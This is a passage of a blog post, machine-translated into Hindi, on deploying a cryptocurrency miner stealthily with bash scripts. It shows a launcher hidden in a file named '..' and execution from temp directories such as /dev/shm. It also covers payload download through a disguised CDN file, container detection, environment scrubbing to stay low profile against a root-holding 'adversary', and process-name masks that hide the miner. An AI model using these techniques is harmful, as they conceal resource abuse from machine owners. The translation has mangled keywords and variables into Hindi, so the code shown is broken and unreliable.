"</span> &gt; env.sh</code></pre><p> यह फ़ाइल परिनियोजित स्क्रिप्ट द्वारा प्राप्त की जाएगी। स्टार्टअप स्क्रिप्ट का अंतिम भाग वास्तविक है<a href="https://en.wikipedia.org/wiki/Trampoline_(computing)"> ट्रैम्पोलिन</a> , वर्तमान शेल प्रक्रिया के भीतर स्क्रिप्ट का मूल्यांकन करें, या यदि संभव हो तो इसे tmux द्वारा प्रबंधित किया जा सकता है।</p><pre><code class="bash hljs"><span class=hljs-comment ># printf preserves quotes</span><span class=hljs-built_in >eval</span><span class=hljs-string >"<span class=hljs-subst > $(प्रिंटफ '%s'<span class=hljs-string >"<span class=hljs-variable > $लांचर</span>"</span>)</span>"</span>  &amp;&gt;/देव/शून्य
<span class=hljs-comment > # या tmux</span><span class=hljs-built_in > गूंज</span><span class=hljs-string >"<span class=hljs-variable > $लांचर</span>"</span> &gt; <span class=hljs-string >".. "</span> 
tmux सेंड-की-टी माइनर<span class=hljs-string >". ./\".. \""</span>  प्रवेश करना</code></pre><p> लॉन्चर स्क्रिप्ट को ".." नाम की फ़ाइल में डंप कर दिया जाता है, यह भ्रमित करने वाला लगता है क्योंकि इसे गलत समझा जा सकता है a<em> माता-पिता</em> निर्देशिका। और हम सेशन कमांड को शामिल नहीं करते हैं, क्योंकि यह प्रोसेस कमांड में रहता है, इसके बजाय हम पहले से tmux सेशन शुरू करते हैं और tmux टर्मिनल इंटरफेस के माध्यम से सोर्स कमांड भेजते हैं। इससे संबंधित, कभी-कभी निष्पादन योग्य को कॉल करना<code>./</code> उन वर्णों को कमांड में रखता है, इसलिए इसे जोड़ना बेहतर है<code>$PWD</code> पथ के लिए..<code>PATH=$PWD:$PATH</code>.</p><h2 id=the_payload ><a class=header-anchor href="#the_payload"> पेलोड</a></h2><p> हमारी तैनाती स्क्रिप्ट सोर्सिंग से शुरू होती है<code>env.sh</code> फ़ाइल, और vars को इस रूप में रखना या कॉन्फ़िगर करना<code>STARTING_*</code> vars like</p><pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable >${STARTING_PATH:-<span class=hljs-variable > $पथ</span>}</span> 
STARTING_PID=<span class=hljs-variable > $बशपिड</span></code></pre><p> यह हमें पर्यावरण को रीसेट करते समय चल रहे इंस्टेंस को मारने और पुनरारंभ करने की अनुमति देता है। निष्पादन क्षमताओं के साथ एक tmp निर्देशिका पर स्विच करने देता है</p><pre><code class="bash hljs"><span class=hljs-comment ># out local subdirectory</span>
pathname=$(<span class=hljs-built_in >printf</span><span class=hljs-string >".%-<span class=hljs-subst > $((रैंडम%9+1)</span> )एस"</span><span class=hljs-keyword > के लिये</span>  पीएच<span class=hljs-keyword > में</span>  {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in > स्थानीय</span> ,~/.कैश,~/};<span class=hljs-keyword > करना</span> 
    आरएम-आरएफ<span class=hljs-string >"<span class=hljs-variable >$ph</span>/<span class=hljs-variable > $पथनाम</span>"</span>  &amp;&amp;
        एमकेडीआईआर -पी<span class=hljs-string >"<span class=hljs-variable >$ph</span>/<span class=hljs-variable > $पथनाम</span>"</span>  &amp;&amp;
        tmppath=<span class=hljs-string >"<span class=hljs-variable >$ph</span>/<span class=hljs-variable > $पथनाम</span>"</span>  &amp;&amp;
        is_path_executable<span class=hljs-string >"<span class=hljs-variable > $tmppath</span>"</span> &amp;&amp;
        <span class=hljs-built_in > निर्यात</span>  पथ =<span class=hljs-string >"<span class=hljs-variable > ${ph}</span>/<span class=hljs-variable > $पथनाम</span>:<span class=hljs-variable > ${पथ}</span>"</span>  tmppath &amp;&amp;
        <span class=hljs-built_in > टूटना</span><span class=hljs-keyword > किया हुआ</span> 
[ -एन<span class=hljs-string >"<span class=hljs-variable > $tmppath</span>"</span> ] &amp;&amp; <span class=hljs-built_in > सीडी</span><span class=hljs-string >"<span class=hljs-variable > $tmppath</span>"</span></code></pre><p> जाँच कर रहा है कि क्या a . के भीतर<a href="https://en.wikipedia.org/wiki/OS-level_virtualization"> पात्र</a> भी आसान है, हम संकेत के लिए फाइल सिस्टम की जांच कर सकते हैं</p><pre><code class="bash hljs">c=$(<span class=hljs-built_in >builtin</span> compgen -G <span class=hljs-string >'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in >builtin</span> compgen -G <span class=hljs-string >'/dev/*'</span>)
s=$(<span class=hljs-built_in >builtin</span> compgen -G <span class=hljs-string >'/sys/*'</span>)
p=$(<span class=hljs-built_in >builtin</span> compgen -G <span class=hljs-string >'/proc/*'</span>)
jail=
<span class=hljs-keyword >if</span> [ -n <span class=hljs-string >"<span class=hljs-variable > $सी</span>"</span>  -ओ-ज़ू<span class=hljs-string >"<span class=hljs-variable > $डी</span>"</span>  -ओ-ज़ू<span class=hljs-string >"<span class=hljs-variable > $s</span>"</span>  -ओ-ज़ू<span class=hljs-string >"<span class=hljs-variable > $पी</span>"</span> ]; <span class=hljs-keyword > फिर</span><span class=hljs-comment > ## हम जेल में हैं</span> 
    जेल = 1
<span class=hljs-keyword >fi</span></code></pre><p> अब हमारे पेलोड को डाउनलोड करने का समय आ गया है, हम wget और curl दोनों का समर्थन करना चुनते हैं, हम पहले से ही जानते हैं कि wget को सावधानीपूर्वक फ़्लैग के साथ कैसे उपयोग करना है, कर्ल के लिए यह थोड़ा अलग है। हमें एक कॉन्फिग फाइल बनानी है, और ओवरराइड करना है<code>CURL_HOME</code></p><pre><code class="bash hljs"><span class=hljs-built_in >echo</span><span class=hljs-string >"url = <span class=hljs-variable > $उरी</span> 
आउटपुट =<span class=hljs-variable > ${नाम}</span><span class=hljs-variable > ${प्रारूप}</span> 
कनेक्ट-टाइमआउट = 10
"</span>  &gt; .curlrc
कर्ल_होम=<span class=hljs-variable > $पीडब्ल्यूडी</span>  कर्ल -सोल</code></pre><p> अंतिम चरण सिर्फ पेलोड निकालने के लिए है</p><pre><code class="bash hljs"><span class=hljs-built_in >type</span> unzip &amp;&gt;/dev/null &amp;&amp;
    format=<span class=hljs-string >".zip"</span> extract=<span class=hljs-string >"unzip -q"</span> ||
        format=<span class=hljs-string >".tar.gz"</span> extract=<span class=hljs-string >"tar xf"</span></code></pre><p> पेलोड की सर्विसिंग के लिए [सीडीएन] के उपयोग का उल्लेख करना उचित है। यहां फिर से बचाव के लिए क्लाउडफ्लेयर हमें बैंडविड्थ व्यय से बचाता है। बस हमारे संपीड़ित पेलोड का नाम बदलकर a<em> फाइल एक्सटेंशन</em> क्लाउडफ्लेयर द्वारा समर्थित...यह कैश्ड हो जाता है। क्लाउडफ्लेयर हेडर की जांच नहीं करता है कि वह क्या सर्विस कर रहा है, शायद इसलिए कि उस पैमाने पर ऐसा करना अव्यावहारिक है।</p><h2 id=adventures_down_bashland ><a class=header-anchor href="#adventures_down_bashland"> एडवेंचर्स डाउन बैशलैंड</a></h2><p> बैश को इस धारणा के साथ चुना गया था कि पोर्टेबल है, जगह से बाहर नहीं दिखता है और अन्य स्क्रिप्टिंग भाषाओं जैसे पर्ल, रूबी या पायथन की तुलना में अधिक सर्वव्यापी है। सच्चाई यह है कि गोलंग या लुआ में लिखा गया एक स्टैंडअलोन बाइनरी बहुत आसान होता, कम बग के साथ, और बनाए रखने में आसान, मूल रूप से बैश मेरे बचाव में सबसे खराब विकल्प था, जब तक कि मैंने बैश के साथ इतने सारे खुजली को खरोंच कर दिया। , फिर से लिखने के लिए बहुत देर हो चुकी थी, और यह एक तरह से उबाऊ भी हो रहा था।</p><p>सभी बिल्टिन (जैसे grep और sed) का उपयोग करने के लिए संकलन समय ध्वज के साथ बिजीबॉक्स का उपयोग करने का विकल्प भी था, हालांकि इस तरह से बिल्टिन का उपयोग करने से नौकरियों (कांटा) को स्पॉन करने की अनुमति नहीं मिलती है और संभावित गतिरोध के लिए डेमॉन को उजागर करता है।</p><p> मैं यहां कुछ बैश कार्यों का वर्णन करूंगा, पूरी सूची उपलब्ध होने के साथ<a href="\assets/posts/bash_functions.txt"> यहां</a></p><pre><code class="bash hljs"><span class=hljs-comment >## echo a string long $1 of random lowercase chars</span><span class=hljs-function ><span class=hljs-title >rand_string</span></span>() {
    <span class=hljs-built_in >local</span> c=0
    <span class=hljs-keyword >while</span> [ <span class=hljs-variable >$c</span> -lt <span class=hljs-variable >$1</span> ]; <span class=hljs-keyword >do</span><span class=hljs-built_in >printf</span><span class=hljs-string >"\x<span class=hljs-subst > $(प्रिंटफ '%x' $((97+RANDOM%25)</span>))"</span> 
        सी=$((सी+<span class=hljs-number >1</span>))
    <span class=hljs-keyword > किया हुआ</span>
}</code></pre><p> उपयोग<code>RANDOM</code> एक वर्ण कोड के अनुरूप 97-122 के बीच एक संख्या प्राप्त करने के लिए चर, प्रिंटफ एक बिल्टिन होना चाहिए, हम एक लूप के भीतर कांटा नहीं करना चाहते हैं।</p><pre><code class="bash hljs"><span class=hljs-comment >## make a new file descriptor named $1</span><span class=hljs-function ><span class=hljs-title >newfd</span></span>() {
    <span class=hljs-built_in >eval</span><span class=hljs-string >"local fd=\${<span class=hljs-variable > $1</span>}"</span><span class=hljs-built_in >eval</span><span class=hljs-string >"exec <span class=hljs-variable > $एफडी</span>&gt;&amp;-"</span>  &amp;&gt;/देव/शून्य
    <span class=hljs-built_in > स्थानीय</span>  पीपी =<span class=hljs-string >".<span class=hljs-subst > $(रैंड_स्ट्रिंग 8)</span>"</span> 
    एमकेफीफो<span class=hljs-variable > $पीपी</span><span class=hljs-built_in > सेट नहीं</span><span class=hljs-string >"<span class=hljs-variable > $1</span>"</span><span class=hljs-built_in >eval</span><span class=hljs-string >"exec {<span class=hljs-variable > $1</span>}&lt;&gt;<span class=hljs-variable > $पीपी</span>"</span><span class=hljs-comment > # नामित पाइप को अनलिंक करें</span> 
    आरएम-एफ<span class=hljs-variable > $पीपी</span>
}</code></pre><p> अनाम फ़ाइल डिस्क्रिप्टर बनाने के लिए लीवरेज पाइप, ये बिल्कुल फ़ाइल डिस्क्रिप्टर की तरह व्यवहार नहीं करते हैं, लेकिन ये काफी अच्छे हैं<a href="https://en.wikipedia.org/wiki/Inter-process_communication"> भारतीय दंड संहिता</a>.</p><pre><code class="bash hljs"><span class=hljs-comment >## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function ><span class=hljs-title >fleep</span></span>()
{
    <span class=hljs-comment ># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string >"<span class=hljs-variable > ${_snore_fd}</span>"</span>  -ए<span class=hljs-string >"<span class=hljs-variable > $1</span>"</span>  != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment > # लॉग "फ्लीप: ${_snore_fd} के साथ प्रतीक्षा करना शुरू करें"</span><span class=hljs-keyword > अगर</span> ! <span class=hljs-built_in > आदेश</span> &gt;&amp;<span class=hljs-variable > ${_snore_fd}</span>; <span class=hljs-keyword > फिर</span> 
        newfd _snore_fd
    <span class=hljs-keyword >fi</span><span class=hljs-built_in > पढ़ना</span>  -टी<span class=hljs-variable > ${1:-1}</span>  यू<span class=hljs-variable > $_snore_fd</span><span class=hljs-comment > # लॉग "फ्लिप: समाप्त"</span>
}</code></pre><p> फोर्किंग के बिना सोना, रीड बिल्टिन की टाइमआउट कार्यक्षमता का दुरुपयोग करके, यह एक समर्पित फ़ाइल डिस्क्रिप्टर का उपयोग करता है और हमें यह सुनिश्चित करना चाहिए कि यह समाप्ति से बचने के लिए उपलब्ध है।</p><p> जैसे कार्य हैं<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> सिस्टम उपयोग की निगरानी के लिए उपयोग किया जाता है, ये सभी लिनक्स का उपयोग करते हैं<code>/proc</code> बिना टूल वाली फाइलें<code>ps</code> , इसलिए कोई फोर्किंग नहीं, सभी शुद्ध बैश।</p><pre><code class="bash hljs"><span class=hljs-function ><span class=hljs-title >start_coproc</span></span>() {
    <span class=hljs-built_in >local</span><span class=hljs-built_in >unset</span><span class=hljs-keyword >while</span> :; <span class=hljs-keyword >do</span><span class=hljs-keyword >if</span> [ <span class=hljs-string >"<span class=hljs-variable > $1</span>"</span> = <span class=hljs-built_in > कार्यकारी</span> ]; <span class=hljs-keyword > फिर</span> 
            coproc_name=<span class=hljs-string >"<span class=hljs-variable > $2</span>"</span><span class=hljs-keyword > अन्यथा</span> 
            coproc_name=<span class=hljs-string >"<span class=hljs-variable > $1</span>"</span><span class=hljs-keyword >fi</span><span class=hljs-keyword > अगर</span>  [ -एन<span class=hljs-string >"<span class=hljs-variable > $UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword > फिर</span><span class=hljs-built_in > सेट नहीं</span>=<span class=hljs-string >"unset <span class=hljs-variable > $UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword >fi</span><span class=hljs-built_in > लॉग</span><span class=hljs-string >"starting coproc <span class=hljs-variable > $coproc_name</span>"</span><span class=hljs-built_in > सेट नहीं</span>  -वी<span class=hljs-string >"<span class=hljs-variable > $coproc_name</span>"</span><span class=hljs-comment > ## केवल चर, कार्य नहीं</span><span class=hljs-built_in >eval</span><span class=hljs-string >"coproc <span class=hljs-variable > $coproc_name</span> { <span class=hljs-variable > $अनसेट</span> $*; }"</span><span class=hljs-comment > # 2&gt;/देव/शून्य</span><span class=hljs-built_in > सेट नहीं</span>  UNSET_COPROC_VARS
        प्रतीक्षा_कोप्रोक<span class=hljs-string >"<span class=hljs-variable > $coproc_name</span>"</span> 3 &amp;&amp; <span class=hljs-built_in > टूटना</span><span class=hljs-keyword > किया हुआ</span>
}
<span class=hljs-function ><span class=hljs-title > स्टॉप_कोप्रोक</span></span>() {
    <span class=hljs-comment > ## एफडी साफ़ करें</span> 
    id_coproc<span class=hljs-string >"<span class=hljs-variable > $1</span>"</span>  &amp;&amp; [ -एन<span class=hljs-string >"<span class=hljs-variable > $job_n</span>"</span> ] &amp;&amp; <span class=hljs-built_in >eval</span><span class=hljs-string >"kill -<span class=hljs-variable > ${2:-9}</span> %<span class=hljs-variable > $job_n</span>"</span> ||
        { <span class=hljs-built_in >eval</span><span class=hljs-string >"kill -<span class=hljs-variable > ${2:-9}</span> \${<span class=hljs-variable > ${1}</span> _पीआईडी}"</span>; } ||
        { <span class=hljs-built_in > लॉग</span><span class=hljs-string >"could not kill the specified coprocess with job <span class=hljs-variable > $job_n</span>"</span> &amp;&amp; <span class=hljs-built_in > वापसी</span> 1; }
}</code></pre><p> बैश के बाद से कोप्रोसेसेस उपलब्ध हैं<code>v4</code> , वे नौकरियों की तरह हैं सिवाय उनके पास एक नाम और उनके स्वयं के फाइल डिस्क्रिप्टर हैं।</p><pre><code class="bash hljs"><span class=hljs-comment >## clear file descriptors</span><span class=hljs-function ><span class=hljs-title >clear_fds</span></span>() {
    <span class=hljs-built_in >local</span> fd
    <span class=hljs-keyword >for</span> fd <span class=hljs-keyword >in</span> $(compgen -G <span class=hljs-string >"/proc/<span class=hljs-variable > $बशपिड</span> /एफडी/*"</span>); <span class=hljs-keyword > करना</span> 
        एफडी =<span class=hljs-variable > ${एफडी/*\/}</span><span class=hljs-keyword > अगर</span> [[ ! <span class=hljs-string >" $* "</span> =~ <span class=hljs-string >" <span class=hljs-variable > ${एफडी}</span> "</span> ]]; <span class=hljs-keyword > फिर</span><span class=hljs-keyword > मामला</span><span class=hljs-string >"<span class=hljs-variable > $एफडी</span>"</span><span class=hljs-keyword > में</span>
                    0|1|2|255|<span class=hljs-string >"<span class=hljs-variable > $_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in >eval</span><span class=hljs-string >"exec <span class=hljs-variable > $एफडी</span>&gt;&amp;-"</span>
                        ;;
                <span class=hljs-keyword > esac</span><span class=hljs-keyword >fi</span><span class=hljs-keyword > किया हुआ</span>
}</code></pre><p> हम एक डेमॉन लिख रहे हैं, जो एक लंबे समय तक चलने वाली प्रक्रिया है, और हम कई फाइल डिस्क्रिप्टर का उपयोग कर रहे हैं, हम वास्तव में कुछ सफाई करना चाहते हैं<a href="https://web.archive.org/web/https://linux.die.net/man/5/limits.conf"> उलिमिट्स</a>.</p><pre><code class="bash hljs"><span class=hljs-comment >## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function ><span class=hljs-title >parse_ip</span></span> ()
{
    <span class=hljs-built_in >export</span> ip country region;
    [ ! -e cfg/geoip.json ] &amp;&amp; <span class=hljs-built_in >log</span><span class=hljs-string >"geolocation codes file not found."</span> &amp;&amp; <span class=hljs-built_in >return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string >"<span class=hljs-variable > $ipquery</span>"</span> ] &amp;&amp; <span class=hljs-built_in > लॉग</span><span class=hljs-string >"failed querying ipinfo"</span> &amp;&amp; <span class=hljs-built_in > वापसी</span> 1;
    before_after <span class=hljs-string > 'आईपी\": \"'</span><span class=hljs-string >"<span class=hljs-variable > $ipquery</span>"</span><span class=hljs-string >'\"'</span> ;
    आईपी ​​= $ (<span class=hljs-built_in > गूंज</span><span class=hljs-variable > $बाद</span> );
    [-z<span class=hljs-string >"<span class=hljs-variable > $आईपी</span>"</span> ] &amp;&amp; <span class=hljs-built_in > लॉग</span><span class=hljs-string >"failed parsing ipinfo data ip"</span> &amp;&amp; <span class=hljs-built_in > वापसी</span> 1;
    before_after <span class=hljs-string > 'देश\": \"'</span><span class=hljs-string >"<span class=hljs-variable > $ipquery</span>"</span><span class=hljs-string >'\"'</span> ;
    देश=$(<span class=hljs-built_in > गूंज</span><span class=hljs-variable > ${बाद,,}</span> );
    [-z<span class=hljs-string >"<span class=hljs-variable > $देश</span>"</span> ] &amp;&amp; <span class=hljs-built_in > लॉग</span><span class=hljs-string >"failed parsing ipinfo data country"</span> &amp;&amp; <span class=hljs-built_in > वापसी</span> 1;
    <span class=hljs-keyword > जबकि</span><span class=hljs-built_in > पढ़ना</span>  एल;<span class=hljs-keyword > करना</span><span class=hljs-keyword > अगर</span> [ <span class=hljs-string >"<span class=hljs-variable > ${एल}</span>"</span> != <span class=hljs-string >"<span class=hljs-variable > ${l/\": {}</span>"</span> ]; <span class=hljs-keyword > फिर</span> 
            पहले बादमे<span class=hljs-string >'"'</span><span class=hljs-string >"<span class=hljs-variable > $ली</span>"</span><span class=hljs-string >'"'</span> ;
            अंतिम क्षेत्र = $ (<span class=hljs-built_in > गूंज</span><span class=hljs-variable > $बाद</span>);
        <span class=hljs-keyword > अन्यथा</span><span class=hljs-keyword > अगर</span> [ <span class=hljs-string >"<span class=hljs-variable > ${एल}</span>"</span> != <span class=hljs-string >"<span class=hljs-variable > ${एल/\"<span class=hljs-variable > ${देश}</span>\"}</span>"</span> ]; <span class=hljs-keyword > फिर</span> 
                क्षेत्र =<span class=hljs-variable > $lastregion</span>;
                <span class=hljs-built_in > टूटना</span>;
            <span class=hljs-keyword >fi</span>;
        <span class=hljs-keyword >fi</span>;
    <span class=hljs-keyword > किया हुआ</span>  &lt;cfg/geoip.json
}</code></pre><p> यह फ़ंक्शन निर्भर करता है<a href="https://ipinfo.io/"> आईपीइन्फो</a> कार्यकर्ता के क्षेत्र को निर्धारित करने के लिए, जो कुछ क्षेत्र निर्भर तर्क को ट्यून करने की अनुमति देता है,<a href="\assets/posts/geoip.json"> geoip.json</a> समूह देशों को क्षेत्रों में, क्योंकि हम शीर्ष स्तर का क्षेत्र चाहते हैं, और विशिष्ट देश में रुचि नहीं रखते हैं।</p><pre><code class="bash hljs"><span class=hljs-comment ># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function ><span class=hljs-title >open_connection</span></span>() {
    <span class=hljs-built_in >exec</span> {socket}&lt;&gt;/dev/tcp/<span class=hljs-variable >${1}</span>/<span class=hljs-variable >${2}</span> 2&gt;/dev/null
    <span class=hljs-built_in >echo</span><span class=hljs-variable >$socket</span> &gt;&amp;<span class=hljs-variable >${3}</span>
}

<span class=hljs-comment >## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function ><span class=hljs-title >check_connection</span></span>() {
    <span class=hljs-built_in >local</span> host=<span class=hljs-variable >$1</span> port=<span class=hljs-variable >$2</span> conn_socket=
    [ -z <span class=hljs-string >"<span class=hljs-variable > $होस्ट</span>"</span> ] &amp;&amp; { <span class=hljs-built_in > गूंज</span><span class=hljs-string > 'कोई होस्ट प्रदान नहीं किया गया'</span>; <span class=hljs-built_in > वापसी</span> 1; }
    [ -z <span class=hljs-string >"<span class=hljs-variable > $पोर्ट</span>"</span> ] &amp;&amp; { <span class=hljs-built_in > गूंज</span><span class=hljs-string > 'कोई बंदरगाह प्रदान नहीं किया गया'</span>; <span class=hljs-built_in > वापसी</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable > $होस्ट</span><span class=hljs-variable > $पोर्ट</span><span class=hljs-variable > $conn_socket</span><span class=hljs-comment > # conn_socket fd से खुले हुए कनेक्शन की fd पढ़ें और इसे बंद करें</span> 
    read_fd<span class=hljs-variable > $conn_socket</span>  एवीएल -
    <span class=hljs-keyword > अगर</span>  [ -एन<span class=hljs-string >"<span class=hljs-variable > $avl</span>"</span> ]; <span class=hljs-keyword > फिर</span><span class=hljs-comment > # निकट संबंध</span><span class=hljs-built_in >eval</span><span class=hljs-string >"exec <span class=hljs-variable > ${avl}</span>&lt;&amp;-"</span>  &amp;&gt;/देव/शून्य
        <span class=hljs-built_in > वापसी</span> 0 <span class=hljs-comment > ## कनेक्शन स्थापित किया जा सकता है</span><span class=hljs-keyword > अन्यथा</span><span class=hljs-built_in > वापसी</span> 1 <span class=hljs-comment > ## कनेक्शन स्थापित नहीं किया जा सकता</span><span class=hljs-keyword >fi</span>
}</code></pre><p> एक अमूर्त होने के कारण, बैश के पास टीसीपी कनेक्शन के लिए समर्थन है<code>/dev/tcp</code> (यूडीपी के लिए भी, लेकिन अधिकांश ऐसा लगता है कि आमतौर पर निर्माण समय पर अक्षम हो जाता है, इसलिए आप इस पर भरोसा नहीं कर सकते हैं)। ये फ़ाइलें एक बैश चीज़ हैं, वे linux का हिस्सा नहीं हैं<code>/dev</code> पेड़।</p><p>बैश नौकरियों के बीच संगामिति को संभालने के लिए लॉकिंग सिस्टम का भी उल्लेख करना उचित है। कई नौकरियों को ताले के साथ काम करने की अनुमति देने के लिए, उन सभी को एक फ़ाइल डिस्क्रिप्टर साझा करने की आवश्यकता होती है, इसलिए हमारा<code>locker</code> जो एक नौकरी भी है, ताला का उपयोग करने की इच्छा रखने वाले अन्य कार्यों से पहले शुरू करना होगा। लॉकर बस पढ़ता है<code>stdin</code> लॉकिंग अनुरोधों की प्रतीक्षा कर रहा है, जवाब दे रहा है<code>stdout</code> एक चर में संग्रहीत वर्तमान बूलियन स्थिति के आधार पर। मैं गारंटी नहीं देता कि यह दृष्टिकोण दौड़ मुक्त है, लेकिन लगता है कि यह शालीनता से काम करता है, दूसरी ओर, मैंने फ़ाइल डिस्क्रिप्टर को बहुत विश्वसनीय नहीं पाया है, क्योंकि मुझे संदेह है कि कुछ बफ़र्स हैं जो कहीं नीचे फ़्लश नहीं होते हैं<em> पाइप्स</em> और अंततः गतिरोध (जिसका अर्थ है कि आप हर समय आपको जवाब देने वाले लॉकर पर भरोसा नहीं कर सकते हैं)।</p><pre><code class="bash hljs"><span class=hljs-comment >## unset bash env apart excluded vars/funcs</span><span class=hljs-function ><span class=hljs-title >clear_env</span></span>(){
    <span class=hljs-built_in >local</span><span class=hljs-built_in >functions</span>=$(<span class=hljs-built_in >declare</span> -F)
    <span class=hljs-built_in >functions</span>=<span class=hljs-variable >${functions//declare -f }</span><span class=hljs-keyword >for</span> u <span class=hljs-keyword >in</span><span class=hljs-variable >$@</span>; <span class=hljs-keyword >do</span><span class=hljs-built_in >functions</span>=<span class=hljs-variable >${functions/$u[[:space:]]}</span><span class=hljs-built_in >functions</span>=<span class=hljs-variable >${functions/[[:space:]]$u}</span><span class=hljs-built_in >functions</span>=<span class=hljs-variable >${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword >done</span><span class=hljs-built_in >local</span> vars=$(<span class=hljs-built_in >set</span> -o posix; <span class=hljs-built_in >set</span> | <span class=hljs-keyword >while</span><span class=hljs-built_in >read</span> l; <span class=hljs-keyword >do</span><span class=hljs-built_in >echo</span><span class=hljs-variable >${l/=*}</span>; <span class=hljs-keyword >done</span>)
    <span class=hljs-keyword >for</span> u <span class=hljs-keyword >in</span><span class=hljs-variable >$@</span>; <span class=hljs-keyword >do</span>
        vars=<span class=hljs-variable >${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable >${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable >${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword >done</span><span class=hljs-built_in >unset</span> -f <span class=hljs-variable >$functions</span> &amp;&gt;/dev/null
    <span class=hljs-built_in >unset</span> -v <span class=hljs-variable >$vars</span> &amp;&gt;/dev/null
    <span class=hljs-comment ># unset $vars &amp;&gt;/dev/null</span>
}

<span class=hljs-comment >## unexport most variables</span><span class=hljs-function ><span class=hljs-title >dex_env</span></span>() {
    exported=$(<span class=hljs-built_in >export</span> -p)
    <span class=hljs-keyword >while</span><span class=hljs-built_in >read</span> e; <span class=hljs-keyword >do</span>
        n=<span class=hljs-variable >${e/declare -*x }</span>
        [ <span class=hljs-string >"<span class=hljs-variable > $n</span>"</span> = <span class=hljs-string >"<span class=hljs-variable > $ई</span>"</span> ] &amp;&amp; <span class=hljs-built_in > जारी रखें</span><span class=hljs-comment > ## मल्टीलाइन वर</span>
        n=<span class=hljs-variable > ${n/=*}</span><span class=hljs-keyword > मामला</span><span class=hljs-string >"<span class=hljs-variable > $n</span>"</span><span class=hljs-keyword > में</span><span class=hljs-string >"SHELL"</span>|<span class=hljs-string >"USER"</span>|<span class=hljs-string >"HOME"</span>|<span class=hljs-string >"TMUX"</span>|<span class=hljs-string >"CHARSET"</span>|<span class=hljs-string >"TERM"</span>)
                <span class=hljs-built_in > जारी रखें</span> 
                ;;
            *)
                डेक्सपोर्टेड =<span class=hljs-string >"<span class=hljs-variable > $डेक्सपोर्टेड</span><span class=hljs-variable > ${n/=*}</span>"</span><span class=hljs-keyword > esac</span><span class=hljs-keyword > किया हुआ</span> &lt;&lt;&lt;<span class=hljs-string >"<span class=hljs-variable > $निर्यात</span>"</span><span class=hljs-built_in > निर्यात</span>  -एन<span class=hljs-variable > $डेक्सपोर्टेड</span>
}</code></pre><p> अपना कचरा साफ करें ... जटिल बैश प्रोग्राम कई चर का उपयोग करके समाप्त होते हैं, और यदि आप वैश्विक स्थान का दुरुपयोग करते हैं तो यह फूला हुआ हो जाता है। यदि आप शेल जॉब्स पैदा कर रहे हैं, तो वे सभी पर्यावरण को विरासत में लेते हैं (जो प्रभावी रूप से डुप्लिकेट किया गया है, साझा नहीं किया गया है), आप जल्दी से बैश खाने के साथ समाप्त हो सकते हैं<code>100M</code> स्मृति का, अच्छा नहीं। साथ ही हम वास्तव में लो प्रोफाइल बनना चाहते हैं। हमारे परिनियोजन परिदृश्य में, विरोधी<sup id="fnref:adversary"><a class=fnref href="#fndef:adversary">[1]</a></sup> संभावित रूप से हमारी प्रक्रियाओं के बारे में रूट एक्सेस और पूरी जानकारी हो सकती है<sup id="fnref:infoproc"><a class=fnref href="#fndef:infoproc">[2]</a></sup> , और आप जानते हैं...हर प्रक्रिया में उस पूर्ण कमांड के बारे में जानकारी होती है जिसने इसे शुरू किया, और निर्यात किए गए पर्यावरण चर।</p><h2 id=configuration ><a class=header-anchor href="#configuration"> विन्यास</a></h2><p>एक बार जब हमारे पास हमारा पर्यावरण और हमारे उपकरण होते हैं, तो हमें अपने माइनर को उस मशीन के लिए ट्यून करना होगा जिस पर वह चल रहा है, छद्म कोड में कॉन्फ़िगरेशन चरण:</p><ul><li><p> खनिक के लिए प्रक्रिया का नाम</p><li><p> होस्ट इन्फोस (रैम/कोर/कैश/<code>ENV_VARS</code>)</p><li><p> विन्यास संस्करण</p><li><p><code>worker_id</code> खान में काम करने वाले के लिए (आईपी और होस्ट से)</p><li><p> कनेक्शन के लिए आईपी/पोर्ट</p></ul><p> प्रक्रिया के लिए एक नाम चुनना आवश्यक है<em> छिपाना</em> तथ्य यह है कि हम एक खनिक चला रहे हैं, लेकिन हम सिर्फ अपने बाइनरी का नाम नहीं बदल रहे हैं, हमारे पास एक सूची है<strong> मास्क</strong> संभावित उम्मीदवारों के लिए (एक सादा पाठ फ़ाइल जहां प्रत्येक पंक्ति एक मुखौटा है):</p><ul><li><p> बेतरतीब ढंग से एक मुखौटा उठाओ</p><li><p> एक विविध प्रक्रिया कमांड प्राप्त करने के लिए स्ट्रिंग की पूंछ के तत्वों (पहले को छोड़कर सभी) को फेरबदल करें। अब हमारे पास एक स्ट्रिंग दिख रही है<code>cmd --arg2 --arg1 --arg3</code> . यह हमारा माइनर मास्क है, हम बाइनरी चलाते हैं<em> के बग़ैर</em> तर्क, लेकिन ऐसा लगता है कि हमने एक आदेश शुरू किया है<code>cmd</code> तर्कों के साथ<code>--arg1 --arg2 --arg3</code> . फ़ाइल नामों में रिक्त स्थान और डैश की अनुमति है, इसलिए इस तरह नामित बाइनरी चलाने के लिए ठीक है, ऐसा लगता है कि लिनक्स निष्पादन योग्य और प्रक्रिया आदेशों को संग्रहीत करते समय तर्कों के बीच नहीं है।</p><p> माइनर कॉन्फ़िगरेशन स्वचालित रूप से से लोड होता है<code>$PWD</code>.</p></ul><h3 id=hashrate ><a class=header-anchor href="#hashrate"> घपलेबाज़ी का दर</a></h3><p> , समय के साथ, अपस्ट्रीम माइनर को कई मिल गए<strong> स्वचालित ट्यूनिंग</strong> सुविधाएँ, इसलिए इसने मेरी लिपियों का हिस्सा बेमानी बना दिया, लेकिन यहाँ अपस्ट्रीम और 